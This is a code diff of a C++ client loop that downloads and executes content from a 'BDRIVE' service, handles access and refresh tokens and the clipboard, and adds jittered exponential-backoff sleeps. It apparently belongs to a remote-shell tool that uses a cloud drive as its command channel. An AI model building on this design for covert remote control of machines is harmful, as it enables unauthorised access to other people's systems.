@@ -3,13 +3,6 @@
 #else
 #define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
 #endif
-//
-//#if SPDLOG_ACTIVE_LEVEL == SPDLOG_LEVEL_OFF
-//#pragma message("SPDLOG_ACTIVE_LEVEL is OFF!")
-//#else
-//#pragma message("SPDLOG_ACTIVE_LEVEL is ACTIVE!")
-//#endif
-
 
 #include <stdio.h>
 #include <iostream>
@@ -71,20 +64,20 @@ int main() {
 				SPDLOG_WARN("Download completed!");
 
 				states.push(STATE_EXECUTING);
-				//sleep
+
 				break;
 			case BDRIVE_INVALID_ACCESS_TOKEN:
 				SPDLOG_WARN("Access token lost!");
 
 				states.push(STATE_DOWNLOADING);
 				states.push(STATE_ACCESS_TOKEN_LOST);
-				//sleep
+
 				break;
 			case BDRIVE_NO_CONTENT:
 				SPDLOG_WARN("Source file is empty!");
 
 				states.push(STATE_DOWNLOADING);
-				//sleep
+
 				break;
 			case BDRIVE_TIMED_OUT:
 			case BDRIVE_NO_INTERNET:
@@ -231,16 +224,21 @@ int main() {
 
 				break;
 			case BDRIVE_NO_CONTENT:
+				SPDLOG_WARN("Clipboard is empty!");
+				states.push(STATE_REFRESH_TOKEN_LOST);
+				break;
 			case BDRIVE_TIMED_OUT:
 			case BDRIVE_NO_INTERNET:
 			default:
 				SPDLOG_WARN("Connection lost!");
+				states.push(STATE_REFRESH_TOKEN_LOST);
 				states.push(STATE_CONNECTION_LOST);
 				break;
 			}
 
 		}
-		else
+		// STATE_CONNECTION_LOST
+		else 
 		{
 			SPDLOG_INFO("Shell is in STATE_CONNECTION_LOST!");
 
@@ -261,7 +259,7 @@ int main() {
 		}
 
 		// This is to know how many times we tried this state that we are in
-		if (top == lastState)
+		if (top == lastState && resCode != BDRIVE_OK)
 		{
 			tries++;
 		}
@@ -276,14 +274,12 @@ int main() {
 		{
 			timeThreshold = expo(5, tries);
 			SPDLOG_INFO("Time threshold is: {}", timeThreshold);
-			Sleep(timeThreshold * 1000);
+			Sleep(timeThreshold * 1000 + (rand() % 10) * 100);
 		}
 		else
 		{
 			Sleep(SLEEP_TIME_THRESHOLD * 1000);
 		}
-
-		//Sleep(3000);
 	}
 	return 0;
 }
